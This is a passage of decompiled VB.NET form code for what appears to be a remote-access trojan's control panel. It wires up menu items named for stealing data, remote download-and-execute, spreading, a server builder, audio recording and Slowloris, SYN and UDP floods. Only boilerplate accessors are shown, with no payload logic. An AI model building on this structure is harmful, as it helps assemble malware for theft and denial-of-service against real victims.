        Friend Overridable Property PingToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._PingToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.PingToolStripMenuItem_Click)
                If (Not Me._PingToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._PingToolStripMenuItem.Click, handler
                End If
                Me._PingToolStripMenuItem = value
                If (Not Me._PingToolStripMenuItem Is Nothing) Then
                    AddHandler Me._PingToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property PlayMusicToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._PlayMusicToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Me._PlayMusicToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property PortScannerToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._PortScannerToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.PortScannerToolStripMenuItem_Click)
                If (Not Me._PortScannerToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._PortScannerToolStripMenuItem.Click, handler
                End If
                Me._PortScannerToolStripMenuItem = value
                If (Not Me._PortScannerToolStripMenuItem Is Nothing) Then
                    AddHandler Me._PortScannerToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ProcessesToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._ProcessesToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Me._ProcessesToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property RandomCursorToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._RandomCursorToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RandomCursorToolStripMenuItem_Click)
                If (Not Me._RandomCursorToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._RandomCursorToolStripMenuItem.Click, handler
                End If
                Me._RandomCursorToolStripMenuItem = value
                If (Not Me._RandomCursorToolStripMenuItem Is Nothing) Then
                    AddHandler Me._RandomCursorToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property RandomIconDesktopToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._RandomIconDesktopToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RandomIconDesktopToolStripMenuItem_Click)
                If (Not Me._RandomIconDesktopToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._RandomIconDesktopToolStripMenuItem.Click, handler
                End If
                Me._RandomIconDesktopToolStripMenuItem = value
                If (Not Me._RandomIconDesktopToolStripMenuItem Is Nothing) Then
                    AddHandler Me._RandomIconDesktopToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property RecordAudioToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._RecordAudioToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Me._RecordAudioToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property RecordToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._RecordToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RecordToolStripMenuItem_Click)
                If (Not Me._RecordToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._RecordToolStripMenuItem.Click, handler
                End If
                Me._RecordToolStripMenuItem = value
                If (Not Me._RecordToolStripMenuItem Is Nothing) Then
                    AddHandler Me._RecordToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property RefreshToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._RefreshToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RefreshToolStripMenuItem_Click)
                If (Not Me._RefreshToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._RefreshToolStripMenuItem.Click, handler
                End If
                Me._RefreshToolStripMenuItem = value
                If (Not Me._RefreshToolStripMenuItem Is Nothing) Then
                    AddHandler Me._RefreshToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property RemoteDownloadExecuteToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._RemoteDownloadExecuteToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RemoteDownloadExecuteToolStripMenuItem_Click)
                If (Not Me._RemoteDownloadExecuteToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._RemoteDownloadExecuteToolStripMenuItem.Click, handler
                End If
                Me._RemoteDownloadExecuteToolStripMenuItem = value
                If (Not Me._RemoteDownloadExecuteToolStripMenuItem Is Nothing) Then
                    AddHandler Me._RemoteDownloadExecuteToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property RemoteFileManagerToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._RemoteFileManagerToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RemoteFileManagerToolStripMenuItem_Click)
                If (Not Me._RemoteFileManagerToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._RemoteFileManagerToolStripMenuItem.Click, handler
                End If
                Me._RemoteFileManagerToolStripMenuItem = value
                If (Not Me._RemoteFileManagerToolStripMenuItem Is Nothing) Then
                    AddHandler Me._RemoteFileManagerToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ResHackerToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._ResHackerToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ResHackerToolStripMenuItem_Click)
                If (Not Me._ResHackerToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._ResHackerToolStripMenuItem.Click, handler
                End If
                Me._ResHackerToolStripMenuItem = value
                If (Not Me._ResHackerToolStripMenuItem Is Nothing) Then
                    AddHandler Me._ResHackerToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property RestartToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._RestartToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RestartToolStripMenuItem_Click)
                If (Not Me._RestartToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._RestartToolStripMenuItem.Click, handler
                End If
                Me._RestartToolStripMenuItem = value
                If (Not Me._RestartToolStripMenuItem Is Nothing) Then
                    AddHandler Me._RestartToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property RestartToolStripMenuItem1 As ToolStripMenuItem
            Get
                Return Me._RestartToolStripMenuItem1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.RestartToolStripMenuItem1_Click)
                If (Not Me._RestartToolStripMenuItem1 Is Nothing) Then
                    RemoveHandler Me._RestartToolStripMenuItem1.Click, handler
                End If
                Me._RestartToolStripMenuItem1 = value
                If (Not Me._RestartToolStripMenuItem1 Is Nothing) Then
                    AddHandler Me._RestartToolStripMenuItem1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property RichTextBox1 As TextBox
            Get
                Return Me.textBox_0
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me.textBox_0 = value
            End Set
        End Property

        Friend Overridable Property RichTextBox2 As RichTextBox
            Get
                Return Me._RichTextBox2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As RichTextBox)
                Me._RichTextBox2 = value
            End Set
        End Property

        Friend Overridable Property RichTextBox3 As RichTextBox
            Get
                Return Me._RichTextBox3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As RichTextBox)
                Me._RichTextBox3 = value
            End Set
        End Property

        Friend Overridable Property RichTextBox4 As RichTextBox
            Get
                Return Me._RichTextBox4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As RichTextBox)
                Me._RichTextBox4 = value
            End Set
        End Property

        Friend Overridable Property SaveToFileToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._SaveToFileToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.SaveToFileToolStripMenuItem_Click)
                If (Not Me._SaveToFileToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._SaveToFileToolStripMenuItem.Click, handler
                End If
                Me._SaveToFileToolStripMenuItem = value
                If (Not Me._SaveToFileToolStripMenuItem Is Nothing) Then
                    AddHandler Me._SaveToFileToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ServerEditorToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._ServerEditorToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.method_18)
                Dim handler2 As EventHandler = New EventHandler(AddressOf Me.method_17)
                Dim handler3 As EventHandler = New EventHandler(AddressOf Me.method_8)
                If (Not Me._ServerEditorToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._ServerEditorToolStripMenuItem.MouseLeave, handler
                    RemoveHandler Me._ServerEditorToolStripMenuItem.MouseEnter, handler2
                    RemoveHandler Me._ServerEditorToolStripMenuItem.Click, handler3
                End If
                Me._ServerEditorToolStripMenuItem = value
                If (Not Me._ServerEditorToolStripMenuItem Is Nothing) Then
                    AddHandler Me._ServerEditorToolStripMenuItem.MouseLeave, handler
                    AddHandler Me._ServerEditorToolStripMenuItem.MouseEnter, handler2
                    AddHandler Me._ServerEditorToolStripMenuItem.Click, handler3
                End If
            End Set
        End Property

        Friend Overridable Property ServerToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._ServerToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Me._ServerToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property SettingsToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._SettingsToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.SettingsToolStripMenuItem_Click)
                If (Not Me._SettingsToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._SettingsToolStripMenuItem.Click, handler
                End If
                Me._SettingsToolStripMenuItem = value
                If (Not Me._SettingsToolStripMenuItem Is Nothing) Then
                    AddHandler Me._SettingsToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ShowSystemInformationToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._ShowSystemInformationToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ShowSystemInformationToolStripMenuItem_Click)
                If (Not Me._ShowSystemInformationToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._ShowSystemInformationToolStripMenuItem.Click, handler
                End If
                Me._ShowSystemInformationToolStripMenuItem = value
                If (Not Me._ShowSystemInformationToolStripMenuItem Is Nothing) Then
                    AddHandler Me._ShowSystemInformationToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ShowTaskbarToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._ShowTaskbarToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ShowTaskbarToolStripMenuItem_Click)
                If (Not Me._ShowTaskbarToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._ShowTaskbarToolStripMenuItem.Click, handler
                End If
                Me._ShowTaskbarToolStripMenuItem = value
                If (Not Me._ShowTaskbarToolStripMenuItem Is Nothing) Then
                    AddHandler Me._ShowTaskbarToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ShowToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._ShowToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ShowToolStripMenuItem_Click)
                If (Not Me._ShowToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._ShowToolStripMenuItem.Click, handler
                End If
                Me._ShowToolStripMenuItem = value
                If (Not Me._ShowToolStripMenuItem Is Nothing) Then
                    AddHandler Me._ShowToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ShutdownToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._ShutdownToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ShutdownToolStripMenuItem_Click)
                If (Not Me._ShutdownToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._ShutdownToolStripMenuItem.Click, handler
                End If
                Me._ShutdownToolStripMenuItem = value
                If (Not Me._ShutdownToolStripMenuItem Is Nothing) Then
                    AddHandler Me._ShutdownToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property SideTab1 As Control0
            Get
                Return Me._SideTab1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Control0)
                Me._SideTab1 = value
            End Set
        End Property

        Friend Overridable Property SkypeToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._SkypeToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Me._SkypeToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property SlowlorisToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._SlowlorisToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Me._SlowlorisToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property Sock5ToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._Sock5ToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Me._Sock5ToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property SpeakComputerToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._SpeakComputerToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Me._SpeakComputerToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property SpreadToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._SpreadToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Me._SpreadToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property SSYNToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._SSYNToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Me._SSYNToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property StartToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._StartToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.StartToolStripMenuItem_Click)
                If (Not Me._StartToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._StartToolStripMenuItem.Click, handler
                End If
                Me._StartToolStripMenuItem = value
                If (Not Me._StartToolStripMenuItem Is Nothing) Then
                    AddHandler Me._StartToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property StartToolStripMenuItem1 As ToolStripMenuItem
            Get
                Return Me._StartToolStripMenuItem1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Me._StartToolStripMenuItem1 = value
            End Set
        End Property

        Friend Overridable Property StartToolStripMenuItem2 As ToolStripMenuItem
            Get
                Return Me._StartToolStripMenuItem2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.StartToolStripMenuItem2_Click)
                If (Not Me._StartToolStripMenuItem2 Is Nothing) Then
                    RemoveHandler Me._StartToolStripMenuItem2.Click, handler
                End If
                Me._StartToolStripMenuItem2 = value
                If (Not Me._StartToolStripMenuItem2 Is Nothing) Then
                    AddHandler Me._StartToolStripMenuItem2.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property StartToolStripMenuItem3 As ToolStripMenuItem
            Get
                Return Me._StartToolStripMenuItem3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.StartToolStripMenuItem3_Click)
                If (Not Me._StartToolStripMenuItem3 Is Nothing) Then
                    RemoveHandler Me._StartToolStripMenuItem3.Click, handler
                End If
                Me._StartToolStripMenuItem3 = value
                If (Not Me._StartToolStripMenuItem3 Is Nothing) Then
                    AddHandler Me._StartToolStripMenuItem3.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property StartToolStripMenuItem4 As ToolStripMenuItem
            Get
                Return Me._StartToolStripMenuItem4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.StartToolStripMenuItem4_Click)
                If (Not Me._StartToolStripMenuItem4 Is Nothing) Then
                    RemoveHandler Me._StartToolStripMenuItem4.Click, handler
                End If
                Me._StartToolStripMenuItem4 = value
                If (Not Me._StartToolStripMenuItem4 Is Nothing) Then
                    AddHandler Me._StartToolStripMenuItem4.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property StartToolStripMenuItem5 As ToolStripMenuItem
            Get
                Return Me._StartToolStripMenuItem5
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.StartToolStripMenuItem5_Click)
                If (Not Me._StartToolStripMenuItem5 Is Nothing) Then
                    RemoveHandler Me._StartToolStripMenuItem5.Click, handler
                End If
                Me._StartToolStripMenuItem5 = value
                If (Not Me._StartToolStripMenuItem5 Is Nothing) Then
                    AddHandler Me._StartToolStripMenuItem5.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property StartToolStripMenuItem6 As ToolStripMenuItem
            Get
                Return Me._StartToolStripMenuItem6
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.StartToolStripMenuItem6_Click)
                If (Not Me._StartToolStripMenuItem6 Is Nothing) Then
                    RemoveHandler Me._StartToolStripMenuItem6.Click, handler
                End If
                Me._StartToolStripMenuItem6 = value
                If (Not Me._StartToolStripMenuItem6 Is Nothing) Then
                    AddHandler Me._StartToolStripMenuItem6.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property StatusStrip1 As StatusStrip
            Get
                Return Me._StatusStrip1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As StatusStrip)
                Me._StatusStrip1 = value
            End Set
        End Property

        Friend Overridable Property StatusToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._StatusToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.StatusToolStripMenuItem_Click)
                If (Not Me._StatusToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._StatusToolStripMenuItem.Click, handler
                End If
                Me._StatusToolStripMenuItem = value
                If (Not Me._StatusToolStripMenuItem Is Nothing) Then
                    AddHandler Me._StatusToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property StealerToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._StealerToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.StealerToolStripMenuItem_Click)
                If (Not Me._StealerToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._StealerToolStripMenuItem.Click, handler
                End If
                Me._StealerToolStripMenuItem = value
                If (Not Me._StealerToolStripMenuItem Is Nothing) Then
                    AddHandler Me._StealerToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property StopRecordToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._StopRecordToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.StopRecordToolStripMenuItem_Click)
                If (Not Me._StopRecordToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._StopRecordToolStripMenuItem.Click, handler
                End If
                Me._StopRecordToolStripMenuItem = value
                If (Not Me._StopRecordToolStripMenuItem Is Nothing) Then
                    AddHandler Me._StopRecordToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property StopToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._StopToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.StopToolStripMenuItem_Click)
                If (Not Me._StopToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._StopToolStripMenuItem.Click, handler
                End If
                Me._StopToolStripMenuItem = value
                If (Not Me._StopToolStripMenuItem Is Nothing) Then
                    AddHandler Me._StopToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property StopToolStripMenuItem1 As ToolStripMenuItem
            Get
                Return Me._StopToolStripMenuItem1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.StopToolStripMenuItem1_Click)
                If (Not Me._StopToolStripMenuItem1 Is Nothing) Then
                    RemoveHandler Me._StopToolStripMenuItem1.Click, handler
                End If
                Me._StopToolStripMenuItem1 = value
                If (Not Me._StopToolStripMenuItem1 Is Nothing) Then
                    AddHandler Me._StopToolStripMenuItem1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property StopToolStripMenuItem2 As ToolStripMenuItem
            Get
                Return Me._StopToolStripMenuItem2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.StopToolStripMenuItem2_Click)
                If (Not Me._StopToolStripMenuItem2 Is Nothing) Then
                    RemoveHandler Me._StopToolStripMenuItem2.Click, handler
                End If
                Me._StopToolStripMenuItem2 = value
                If (Not Me._StopToolStripMenuItem2 Is Nothing) Then
                    AddHandler Me._StopToolStripMenuItem2.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property StopToolStripMenuItem4 As ToolStripMenuItem
            Get
                Return Me._StopToolStripMenuItem4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.StopToolStripMenuItem4_Click)
                If (Not Me._StopToolStripMenuItem4 Is Nothing) Then
                    RemoveHandler Me._StopToolStripMenuItem4.Click, handler
                End If
                Me._StopToolStripMenuItem4 = value
                If (Not Me._StopToolStripMenuItem4 Is Nothing) Then
                    AddHandler Me._StopToolStripMenuItem4.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property StopToolStripMenuItem5 As ToolStripMenuItem
            Get
                Return Me._StopToolStripMenuItem5
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.StopToolStripMenuItem5_Click)
                If (Not Me._StopToolStripMenuItem5 Is Nothing) Then
                    RemoveHandler Me._StopToolStripMenuItem5.Click, handler
                End If
                Me._StopToolStripMenuItem5 = value
                If (Not Me._StopToolStripMenuItem5 Is Nothing) Then
                    AddHandler Me._StopToolStripMenuItem5.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property StopToolStripMenuItem6 As ToolStripMenuItem
            Get
                Return Me._StopToolStripMenuItem6
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.StopToolStripMenuItem6_Click)
                If (Not Me._StopToolStripMenuItem6 Is Nothing) Then
                    RemoveHandler Me._StopToolStripMenuItem6.Click, handler
                End If
                Me._StopToolStripMenuItem6 = value
                If (Not Me._StopToolStripMenuItem6 Is Nothing) Then
                    AddHandler Me._StopToolStripMenuItem6.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property SUDPToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._SUDPToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Me._SUDPToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property SwapMouseButtonToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._SwapMouseButtonToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.SwapMouseButtonToolStripMenuItem_Click)
                If (Not Me._SwapMouseButtonToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._SwapMouseButtonToolStripMenuItem.Click, handler
                End If
                Me._SwapMouseButtonToolStripMenuItem = value
                If (Not Me._SwapMouseButtonToolStripMenuItem Is Nothing) Then
                    AddHandler Me._SwapMouseButtonToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property TabPage1 As TabPage
            Get
                Return Me._TabPage1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TabPage)
                Me._TabPage1 = value
            End Set
        End Property

        Friend Overridable Property TabPage2 As TabPage
            Get
                Return Me._TabPage2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TabPage)
                Me._TabPage2 = value
            End Set
        End Property

        Friend Overridable Property TabPage3 As TabPage
            Get
                Return Me._TabPage3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TabPage)
                Me._TabPage3 = value
            End Set
        End Property

        Friend Overridable Property TabPage4 As TabPage
            Get
                Return Me._TabPage4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TabPage)
                Me._TabPage4 = value
            End Set
        End Property

        Friend Overridable Property TabPage5 As TabPage
            Get
                Return Me._TabPage5
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TabPage)
                Me._TabPage5 = value
            End Set
        End Property

        Friend Overridable Property TCPToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._TCPToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Me._TCPToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property TextBox1 As TextBox
            Get
                Return Me._TextBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me._TextBox1 = value
            End Set
        End Property

        Friend Overridable Property TextBox2 As TextBox
            Get
                Return Me._TextBox2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.TextBox2_TextChanged)
                If (Not Me._TextBox2 Is Nothing) Then
                    RemoveHandler Me._TextBox2.TextChanged, handler
                End If
                Me._TextBox2 = value
                If (Not Me._TextBox2 Is Nothing) Then
                    AddHandler Me._TextBox2.TextChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property textsteam As TextBox
            Get
                Return Me._textsteam
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me._textsteam = value
            End Set
        End Property

        Friend Overridable Property Timer1 As Timer
            Get
                Return Me.timer_0
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
